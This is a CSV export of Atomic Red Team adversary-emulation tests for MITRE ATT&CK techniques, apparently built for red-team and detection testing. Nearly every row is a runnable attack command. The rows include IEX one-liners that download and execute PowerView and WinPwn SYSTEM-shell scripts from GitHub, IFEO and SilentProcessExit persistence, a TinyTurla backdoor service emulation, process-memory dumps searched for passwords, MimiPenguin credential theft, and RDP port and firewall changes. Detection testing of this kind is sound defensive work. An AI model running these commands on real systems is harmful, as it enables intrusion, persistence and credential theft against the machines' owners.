T1546.012,Event Triggered Execution: Image File Execution Options Injection,IFEO Global Flags,46b1f278-c8ee-4aa5-acce-65e77b11f3c1,"Leverage Global Flags Settings
",windows,,,"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1
REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""
",command_prompt,True,,"reg delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /f >nul 2>&1
",,,"input_arguments.target_binary.description: Binary To Attach To

input_arguments.target_binary.type: path

input_arguments.target_binary.default: notepad.exe

input_arguments.payload_binary.description: Binary To Execute

input_arguments.payload_binary.type: path

input_arguments.payload_binary.default: C:\Windows\System32\cmd.exe

"
T1546.012,Event Triggered Execution: Image File Execution Options Injection,GlobalFlags in Image File Execution Options,13117939-c9b2-4a43-999e-0a543df92f0d,"The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.
Upon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. 
Upon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.
",windows,,,"$Name = ""GlobalFlag""
$Value = ""512""
$registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{process}""
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force
$Name = ""ReportingMode""
$Value = ""1""
$SilentProcessExit = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{process}""
New-Item -Path $SilentProcessExit -Force
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force 

$Name = ""MonitorProcess""
$Value = ""#{cmd_to_run}""
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force
Start-Process whoami.exe
",powershell,True,,"$SilentProcessExit = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{process}"" 
Remove-Item $SilentProcessExit -force
$registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{process}""
Remove-Item $registryPath -force
",,,"input_arguments.process.description: Process to monitor


input_arguments.process.type: string

input_arguments.process.default: whoami.exe

input_arguments.cmd_to_run.description: Command to execute


input_arguments.cmd_to_run.type: string

input_arguments.cmd_to_run.default: cmd.exe /c calc.exe

"
T1202,Indirect Command Execution,Indirect Command Execution - pcalua.exe,cecfea7a-5f03-4cdd-8bc8-6f7c22862440,"The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.
[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)
Upon execution, calc.exe should open
",windows,,,"pcalua.exe -a #{process}
pcalua.exe -a #{payload_path}
",command_prompt,,,,,,"input_arguments.payload_path.description: Path to payload

input_arguments.payload_path.type: path

input_arguments.payload_path.default: C:\Windows\System32\calc.exe

input_arguments.process.description: Process to execute

input_arguments.process.type: string

input_arguments.process.default: calc.exe

"
T1202,Indirect Command Execution,Indirect Command Execution - forfiles.exe,8b34a448-40d9-4fc3-a8c8-4bb286faf7dc,"forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.
[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)
""This is basically saying for each occurrence of notepad.exe in c:\windows\system32 run calc.exe""
Upon execution calc.exe will be opened.
",windows,,,"forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
",command_prompt,,,,,,"input_arguments.process.description: Process to execute

input_arguments.process.type: string

input_arguments.process.default: calc.exe

"
T1202,Indirect Command Execution,Indirect Command Execution - conhost.exe,cf3391e0-b482-4b02-87fc-ca8362269b29,"conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.
Executing it through command line can create process ancestry anomalies
[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)
",windows,,,"conhost.exe ""#{process}""
",command_prompt,,,,,,"input_arguments.process.description: Process to execute

input_arguments.process.type: string

input_arguments.process.default: notepad.exe

"
T1543.003,Create or Modify System Process: Windows Service,Modify Fax service to run PowerShell,ed366cde-7d12-49df-a833-671904770b9f,"This test will temporarily modify the service Fax by changing the binPath to PowerShell
and will then revert the binPath change, restoring Fax to its original state.
Upon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.
",windows,,,"sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'T1543.003 Test'\""""
sc start Fax
",command_prompt,True,,"sc config Fax binPath= ""C:\WINDOWS\system32\fxssvc.exe"" >nul 2>&1",,,
T1543.003,Create or Modify System Process: Windows Service,Service Installation CMD,981e2942-e433-44e9-afc1-8c957a1496b6,"Download an executable from github and start it as a service.
Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
",windows,,,"sc.exe create #{service_name} binPath= ""#{binary_path}"" start=#{startup_type}  type=#{service_type}
sc.exe start #{service_name}
",command_prompt,True,,"sc.exe stop #{service_name} >nul 2>&1
sc.exe delete #{service_name} >nul 2>&1
",powershell,"dependencies.0.description: Service binary must exist on disk at specified location (#{binary_path})

dependencies.0.prereq_command: if (Test-Path ""#{binary_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{binary_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"" -OutFile ""#{binary_path}""

","input_arguments.binary_path.description: Name of the service binary, include path.

input_arguments.binary_path.type: path

input_arguments.binary_path.default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe

input_arguments.service_type.description: Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare

input_arguments.service_type.type: string

input_arguments.service_type.default: Own

input_arguments.startup_type.description: Service start method. May be boot|system|auto|demand|disabled|delayed-auto

input_arguments.startup_type.type: string

input_arguments.startup_type.default: auto

input_arguments.service_name.description: Name of the Service

input_arguments.service_name.type: string

input_arguments.service_name.default: AtomicTestService_CMD

"
T1543.003,Create or Modify System Process: Windows Service,Service Installation PowerShell,491a4af6-a521-4b74-b23b-f7b3f1ee9e77,"Installs A Local Service via PowerShell.
Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.
",windows,,,"New-Service -Name ""#{service_name}"" -BinaryPathName ""#{binary_path}""
Start-Service -Name ""#{service_name}""
",powershell,True,,"Stop-Service -Name ""#{service_name}"" 2>&1 | Out-Null
try {(Get-WmiObject Win32_Service -filter ""name='#{service_name}'"").Delete()}
catch {}
",powershell,"dependencies.0.description: Service binary must exist on disk at specified location (#{binary_path})

dependencies.0.prereq_command: if (Test-Path ""#{binary_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{binary_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"" -OutFile ""#{binary_path}""

","input_arguments.binary_path.description: Name of the service binary, include path.

input_arguments.binary_path.type: path

input_arguments.binary_path.default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe

input_arguments.service_name.description: Name of the Service

input_arguments.service_name.type: string

input_arguments.service_name.default: AtomicTestService_PowerShell

"
T1543.003,Create or Modify System Process: Windows Service,TinyTurla backdoor service w64time,ef0581fd-528e-4662-87bc-4c2affb86940,"It's running Dll as service to emulate the TinyTurla backdoor

[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)
",windows,,,"copy ""#{dllfilename}"" %systemroot%\system32\
sc create W64Time binPath= ""c:\Windows\System32\svchost.exe -k TimeService"" type= share start=auto
sc config W64Time DisplayName= ""Windows 64 Time""
sc description W64Time ""Maintain date and time synch on all clients and services in the network""
reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /t REG_MULTI_SZ /d ""W64Time"" /f
reg add ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /t REG_EXPAND_SZ /d ""%systemroot%\system32\w64time.dll"" /f
sc start W64Time",command_prompt,True,,"sc stop W64Time
sc.exe delete W64Time
del %systemroot%\system32\w64time.dll
reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost"" /v TimeService /f
reg delete ""HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters"" /v ServiceDll /f",,,"input_arguments.dllfilename.description: It specifies Dll file to run as service

input_arguments.dllfilename.type: string

input_arguments.dllfilename.default: $PathToAtomicsFolder\T1543.003\bin\w64time.dll

"
T1543.003,Create or Modify System Process: Windows Service,Remote Service Installation CMD,fb4151a2-db33-4f8c-b7f8-78ea8790f961,"Download an executable from github and start it as a service on a remote endpoint
Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
",windows,,,"sc.exe \\#{remote_host} create #{service_name} binPath= ""#{binary_path}"" start=#{startup_type} type=#{service_type}
sc.exe \\#{remote_host} start #{service_name}
",command_prompt,True,,"sc.exe \\#{remote_host} stop #{service_name} >nul 2>&1
sc.exe \\#{remote_host} delete #{service_name} >nul 2>&1
",powershell,"dependencies.0.description: Service binary must exist on disk at specified location (#{binary_path})

dependencies.0.prereq_command: if (Test-Path ""#{binary_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{binary_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe"" -OutFile ""#{binary_path}""

","input_arguments.binary_path.description: Name of the service binary, include path.

input_arguments.binary_path.type: path

input_arguments.binary_path.default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe

input_arguments.service_type.description: Type of service. May be own,share,interact,kernel,filesys,rec,userown,usershare

input_arguments.service_type.type: string

input_arguments.service_type.default: Own

input_arguments.startup_type.description: Service start method. May be boot,system,auto,demand,disabled,delayed-auto

input_arguments.startup_type.type: string

input_arguments.startup_type.default: auto

input_arguments.service_name.description: Name of the Service

input_arguments.service_name.type: string

input_arguments.service_name.default: AtomicTestService_CMD

input_arguments.remote_host.description: Name of the remote endpoint

input_arguments.remote_host.type: string

input_arguments.remote_host.default: localhost

"
T1543.003,Create or Modify System Process: Windows Service,Modify Service to Run Arbitrary Binary (Powershell),1f896ce4-8070-4959-8a25-2658856a70c9,"This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.
This technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. 
[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)
",windows,,,"Stop-Service -Name ""#{service_name}"" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name ""#{service_name}"" -path ""#{new_bin_path}""
start-service -Name ""#{service_name}"" -erroraction silentlycontinue | out-null",powershell,True,,"Stop-Service -Name ""#{service_name}"" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name ""#{service_name}"" -path ""#{original_bin_path}"" -erroraction silentlycontinue | out-null",,,"input_arguments.service_name.description: Name of the service to modify

input_arguments.service_name.type: string

input_arguments.service_name.default: fax

input_arguments.new_bin_path.description: Path of the new service binary

input_arguments.new_bin_path.type: String

input_arguments.new_bin_path.default: $env:windir\system32\notepad.exe

input_arguments.original_bin_path.description: Path of the original service binary

input_arguments.original_bin_path.type: String

input_arguments.original_bin_path.default: $env:windir\system32\fxssvc.exe

"
T1033,System Owner/User Discovery,System Owner/User Discovery,4c4959bf-addf-4b4a-be86-8d09cc1857aa,"Identify System owner or users on an endpoint.

Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. 
Additionally, two files will be written to disk - computers.txt and usernames.txt.
",windows,,,"cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:""#{computer_name}""
quser
qwinsta.exe /server:#{computer_name}
qwinsta.exe
for /F ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt
@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
",command_prompt,,,,,,"input_arguments.computer_name.description: Name of remote computer

input_arguments.computer_name.type: string

input_arguments.computer_name.default: localhost

"
T1033,System Owner/User Discovery,System Owner/User Discovery,2a9b677d-a230-44f4-ad86-782df1ef108c,"Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
",linux,macos,,"users
w
who
",sh,,,,,,
T1033,System Owner/User Discovery,Find computers where user has session - Stealth mode (PowerView),29857f27-a36f-4f7e-8084-4557cd6207ca,"Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
",powershell,,,,,,
T1033,System Owner/User Discovery,User Discovery With Env Vars PowerShell Script,dcb6cdee-1fb0-4087-8bf8-88cfd136ba51,Use the PowerShell environment variables to identify the current logged user.,windows,,,"[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append
",powershell,,,"Remove-Item -Path .\CurrentactiveUser.txt -Force
",,,
T1033,System Owner/User Discovery,GetCurrent User with PowerShell Script,1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b,"Use the PowerShell ""GetCurrent"" method of the WindowsIdentity .NET class to identify the logged user.",windows,,,"[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
",powershell,,,"Remove-Item -Path .\CurrentUserObject.txt -Force
",,,
T1033,System Owner/User Discovery,System Discovery - SocGholish whoami,3d257a03-eb80-41c5-b744-bb37ac7f65c7,"SocGholish performs whoami discovery commands and outputs the results to a tmp file. 
The test will generate a filename similar to the random one generated during execution and write the file to AppData\Temp.

Reference: https://redcanary.com/threat-detection-report/threats/socgholish/
",windows,,,"$TokenSet = @{
  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  N = [Char[]]'0123456789'
}
$Upper = Get-Random -Count 5 -InputObject $TokenSet.U
$Number = Get-Random -Count 5 -InputObject $TokenSet.N
$StringSet = $Upper + $Number
$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
$file = ""rad"" + $rad + "".tmp""

whoami.exe /all >> #{output_path}\$file
",powershell,,,"Remove-Item -Path #{output_path}\rad*.tmp -Force
",,,"input_arguments.output_path.description: Location of output file

input_arguments.output_path.type: string

input_arguments.output_path.default: $env:temp

"
T1033,System Owner/User Discovery,System Owner/User Discovery Using Command Prompt,ba38e193-37a6-4c41-b214-61b33277fe36,Identify the system owner or current user using native Windows command prompt utilities.,windows,,,"set file=#{output_file_path}\user_info_%random%.tmp
echo Username: %USERNAME% > %file%
echo User Domain: %USERDOMAIN% >> %file%
net users >> %file%
query user >> %file%
",command_prompt,False,,"del #{output_file_path}\\user_info_*.tmp
",,,"input_arguments.output_file_path.description: Location of output file.

input_arguments.output_file_path.type: string

input_arguments.output_file_path.default: $env:temp

"
T1106,Native API,Execution through API - CreateProcess,99be2089-c52d-4a4a-b5c3-261ee42c8b62,"Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",windows,,,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""#{output_file}"" /target:exe ""#{source_file}""
%tmp%/T1106.exe
",command_prompt,,,,powershell,"dependencies.0.description: #{source_file} must exist on system.

dependencies.0.prereq_command: if (Test-Path ""#{source_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{source_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs"" -OutFile ""#{source_file}""

","input_arguments.source_file.description: Location of the CSharp source file to compile and execute

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder\T1106\src\CreateProcess.cs

input_arguments.output_file.description: Location of the payload

input_arguments.output_file.type: path

input_arguments.output_file.default: %tmp%\T1106.exe

"
T1106,Native API,WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,ce4e76e6-de70-4392-9efe-b281fc2b4087,Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1'),powershell,,,,,,
T1106,Native API,WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique,7ec5b74e-8289-4ff2-a162-b6f286a33abd,Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1'),powershell,,,,,,
T1106,Native API,WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,e1f93a06-1649-4f07-89a8-f57279a7d60e,Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1'),powershell,,,,,,
T1106,Native API,Run Shellcode via Syscall in Go,ae56083f-28d0-417d-84da-df4242da1f7c,"Runs shellcode in the current running process via a syscall.

Steps taken with this technique
1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
3. Change the memory page permissions to Execute/Read with VirtualProtect
4. Use syscall to execute the entrypoint of the shellcode

- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)
",windows,,,"$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
",powershell,False,,Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue,,,
T1003.007,OS Credential Dumping: Proc Filesystem,Dump individual process memory with sh (Local),7e91138a-8e74-456d-a007-973d67a0bb80,"Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
copy process memory to an external file so it can be searched or exfiltrated later.
",linux,,,"sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""#{output_file}""
",sh,True,,"rm -f ""#{output_file}""
",,"dependencies.0.description: Script to launch target process must exist

dependencies.0.prereq_command: test -f #{script_path}
grep ""#{pid_term}"" #{script_path}

dependencies.0.get_prereq_command: echo '#!/bin/sh' > #{script_path}
echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path}

","input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.007.bin

input_arguments.script_path.description: Path to script generating the target process

input_arguments.script_path.type: path

input_arguments.script_path.default: /tmp/T1003.007.sh

input_arguments.pid_term.description: Unique string to use to identify target process

input_arguments.pid_term.type: string

input_arguments.pid_term.default: T1003.007

"
T1003.007,OS Credential Dumping: Proc Filesystem,Dump individual process memory with sh on FreeBSD (Local),fa37b633-e097-4415-b2b8-c5bf4c86e423,"Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
copy process memory to an external file so it can be searched or exfiltrated later.
On FreeBSD procfs must be mounted.
",linux,,,"sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
MEM_START=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f1)
MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)
MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
strings ""#{output_file}"" | grep -i PASS
",sh,True,,"rm -f ""#{output_file}""
",,"dependencies.0.description: Script to launch target process must exist

dependencies.0.prereq_command: test -f #{script_path}
grep ""#{pid_term}"" #{script_path}

dependencies.0.get_prereq_command: echo '#!/bin/sh' > #{script_path}
echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path}

","input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.007.bin

input_arguments.script_path.description: Path to script generating the target process

input_arguments.script_path.type: path

input_arguments.script_path.default: /tmp/T1003.007.sh

input_arguments.pid_term.description: Unique string to use to identify target process

input_arguments.pid_term.type: string

input_arguments.pid_term.default: T1003.007

"
T1003.007,OS Credential Dumping: Proc Filesystem,Dump individual process memory with Python (Local),437b2003-a20d-4ed8-834c-4964f24eec63,"Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
copy a process's heap memory to an external file so it can be searched or exfiltrated later.
On FreeBSD procfs must be mounted.
",linux,,,"sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
PYTHON=$(which python || which python3 || which python2)
$PYTHON #{python_script} $PID #{output_file}
grep -i ""PASS"" ""#{output_file}""
",sh,True,,"rm -f ""#{output_file}""
",,"dependencies.0.description: Script to launch target process must exist

dependencies.0.prereq_command: test -f #{script_path}
grep ""#{pid_term}"" #{script_path}

dependencies.0.get_prereq_command: echo '#!/bin/sh' > #{script_path}
echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path}

dependencies.1.description: Requires Python

dependencies.1.prereq_command: (which python || which python3 || which python2)

dependencies.1.get_prereq_command: echo ""Python 2.7+ or 3.4+ must be installed""

","input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.007.bin

input_arguments.script_path.description: Path to script generating the target process

input_arguments.script_path.type: path

input_arguments.script_path.default: /tmp/T1003.007.sh

input_arguments.python_script.description: Path to script generating the target process

input_arguments.python_script.type: path

input_arguments.python_script.default: PathToAtomicsFolder/T1003.007/src/dump_heap.py

input_arguments.pid_term.description: Unique string to use to identify target process

input_arguments.pid_term.type: string

input_arguments.pid_term.default: T1003.007

"
T1003.007,OS Credential Dumping: Proc Filesystem,Capture Passwords with MimiPenguin,a27418de-bdce-4ebd-b655-38f04842bf0c,"MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). 
Upon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. 
See https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. 
See https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.
",linux,,,"sudo #{MimiPenguin_Location} > #{output_file}
cat #{output_file}
",bash,True,,"rm -f #{output_file} > /dev/null
",sh,"dependencies.0.description: MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})

dependencies.0.prereq_command: if [ -f ""#{MimiPenguin_Location}"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: wget -O ""/tmp/mimipenguin.tar.gz"" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
mkdir /tmp/mimipenguin
tar -xzvf ""/tmp/mimipenguin.tar.gz"" -C /tmp/mimipenguin

dependencies.1.description: Strings must be installed

dependencies.1.prereq_command: if [ -x ""$(command -v strings --version)"" ]; then exit 0; else exit 1; fi;

dependencies.1.get_prereq_command: sudo apt-get -y install binutils

dependencies.2.description: Python2 must be installed

dependencies.2.prereq_command: if [ -x ""$(command -v python2 --version)"" ]; then exit 0; else exit 1; fi;

dependencies.2.get_prereq_command: sudo apt-get -y install python2       

dependencies.3.description: Libc-bin must be installed

dependencies.3.prereq_command: if [ -x ""$(command -v ldd --version)"" ]; then exit 0; else exit 1; fi;

dependencies.3.get_prereq_command: sudo apt-get -y install libc-bin        

","input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.007Test3.txt

input_arguments.MimiPenguin_Location.description: Path of MimiPenguin script

input_arguments.MimiPenguin_Location.type: path

input_arguments.MimiPenguin_Location.default: /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh

"
T1021.001,Remote Services: Remote Desktop Protocol,RDP to DomainController,355d4632-8cb9-449d-91ce-b566d0253d3e,"Attempt an RDP session via Remote Desktop Application to a DomainController.
",windows,,,"$Server=#{logonserver}
$User = Join-Path #{domain} #{username}
$Password=""#{password}""
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo ""RDP connection established""
",powershell,,,"$p=Tasklist /svc /fi ""IMAGENAME eq mstsc.exe"" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
",,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

","input_arguments.logonserver.description: ComputerName argument default %logonserver%

input_arguments.logonserver.type: string

input_arguments.logonserver.default: $ENV:logonserver.TrimStart(""\"")

input_arguments.domain.description: domain argument default %USERDOMAIN%

input_arguments.domain.type: string

input_arguments.domain.default: $Env:USERDOMAIN

input_arguments.username.description: Username argument default %username%

input_arguments.username.type: string

input_arguments.username.default: $ENV:USERNAME

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: 1password2!

"
T1021.001,Remote Services: Remote Desktop Protocol,Changing RDP Port to Non Standard Port via Powershell,2f840dd4-8a2e-4f44-beb3-6b2399ea3771,"Changing RDP Port to Non Standard Port via Powershell
",windows,,,"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
",powershell,True,,"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{OLD_Remote_Port}
Remove-NetFirewallRule -DisplayName ""RDPPORTLatest-TCP-In"" -ErrorAction Ignore 
Get-Service TermService | Restart-Service -Force -ErrorAction Ignore 
",,,"input_arguments.OLD_Remote_Port.description: Default RDP Listening Port

input_arguments.OLD_Remote_Port.type: string

input_arguments.OLD_Remote_Port.default: 3389

input_arguments.NEW_Remote_Port.description: New RDP Listening Port

input_arguments.NEW_Remote_Port.type: string

input_arguments.NEW_Remote_Port.default: 4489

"
T1021.001,Remote Services: Remote Desktop Protocol,Changing RDP Port to Non Standard Port via Command_Prompt,74ace21e-a31c-4f7d-b540-53e4eb6d1f73,"Changing RDP Port to Non Standard Port via Command_Prompt
",windows,,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f
netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
",command_prompt,True,,"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1
netsh advfirewall firewall delete rule name=""RDPPORTLatest-TCP-In"" >nul 2>&1
net stop TermService /y >nul 2>&1
net start TermService >nul 2>&1
",,,"input_arguments.OLD_Remote_Port.description: Default RDP Listening Port

input_arguments.OLD_Remote_Port.type: string

input_arguments.OLD_Remote_Port.default: 3389

input_arguments.NEW_Remote_Port.description: New RDP Listening Port

